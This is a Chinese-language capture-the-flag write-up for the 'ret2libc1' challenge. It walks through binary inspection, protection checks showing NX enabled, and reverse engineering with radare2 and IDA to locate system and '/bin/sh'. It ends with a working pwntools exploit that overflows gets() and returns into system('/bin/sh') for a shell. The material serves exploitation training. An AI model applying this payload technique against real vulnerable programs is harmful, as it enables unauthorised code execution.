# ret2libc1
## 執行結果

會自動印出 " RET2LIBC >_<"

接著輸入任意字串

結束執行

![image](https://user-images.githubusercontent.com/22366572/148839660-8d8a26ce-cc93-417c-8cb0-e9650c19ffdb.png)

## 分析步驟
### Step 1 : 獲得檔案的基本資料

指令: ```file [執行檔名]```

![image](https://user-images.githubusercontent.com/22366572/148839990-0c63cbd9-9962-4996-ab85-9c7076b701e3.png)

可以看到它是在 GNU/Linux 2.6.24 上編譯的，dynamically linked (動態連接的)，ELF 32-bit LSB executable

### Step 2 : 看開啟了哪些保護機制

指令: ```checksec [執行檔名]```

![image](https://user-images.githubusercontent.com/22366572/148840299-0e68c03b-1981-44d4-aca7-99bba7bc32e1.png)

可以看到 **NX 是開啟的**

NX enabled 如果開啟就代表 **stack 中的數據沒有執行權限**，所以當攻擊者在 stack 上部屬自己的 shellcode 並觸發時，只會直接造成程式崩潰，**但是可以利用 ROP 這種方式繞過**

### Step 3 : 做逆向工程

1. 使用 radare2 做逆向工程

main逆向指令:
```
r2 ret2libc1
aa
afl
s main
VV
```

![image](https://user-images.githubusercontent.com/22366572/148843327-fd3feff5-73bf-44aa-a282-3ce671064e41.png)
![image](https://user-images.githubusercontent.com/22366572/148843405-e292c8ce-3af2-4cd8-bbe1-61f8a34469c3.png)

main 組語:

![image](https://user-images.githubusercontent.com/22366572/148843714-b63adba8-ff46-4f09-aeb1-58c6bfb0922c.png)
![image](https://user-images.githubusercontent.com/22366572/148843805-075b7465-4668-4467-9469-d3ba5e8c1483.png)

可以發現有 call sys.imp.gets，這會取得輸入的字串。因為是 dynamically linked (動態連接的)，那就會用一個程序來調動動態連接庫。這裡會用 sys / system 指令來執行系統裡的指令，接著我們需要找找是否有可執行的指令路徑 (/bin/sh)

08048460
08048720

### Step 4 : 找到 system 和 /bin/sh 的位置

使用IDA

**/bin/sh 的位置:**

![image](https://user-images.githubusercontent.com/22366572/148924732-63682ab5-386a-4308-8b8b-959053b8639e.png)

/bin/sh 的地址: 0x08048720

**system 的位置:**

![image](https://user-images.githubusercontent.com/22366572/148925253-7d27c39c-0253-447a-9ed8-d3772636d1f9.png)

點進去可以找到地址:

![image](https://user-images.githubusercontent.com/22366572/148925326-54bef09f-6fac-4dce-b644-3b06717ada63.png)

system 的地址: 0x08048460

由 pateern 的 offset 可以確定偏移量 = 112

接著我們要做的是控制程序返回到 system 的地址，然後調用 /bin/sh


### Step 6 : 撰寫 exploit code

**Exploit code :**

(檔名: exp-ret2libc1.py)

```
from pwn import *

r = process('./ret2libc1')

sys_addr = 0x08048460
binsh_addr = 0x08048720

payload = 112*'A' + p32(sys_addr) + 4*'A' + p32(binsh_addr)
r.sendline(payload)
r.interactive()
```

後面的4 * 'A' 其實是system的返回地址，是隨便設的，主要是後面的參數bin/sh地址要正確。

棧中ebp一下的部分從上到下依次是（低地址到高地址）：

  * 返回地址（覆蓋為sys的地址）
  * system的返回地址（隨便設）
  * system的參數（/bin/sh）

## 參考資料

1. https://blog.csdn.net/ATFWUS/article/details/104563942
2. https://www.bilibili.com/video/BV1Vg4y1z7oF/
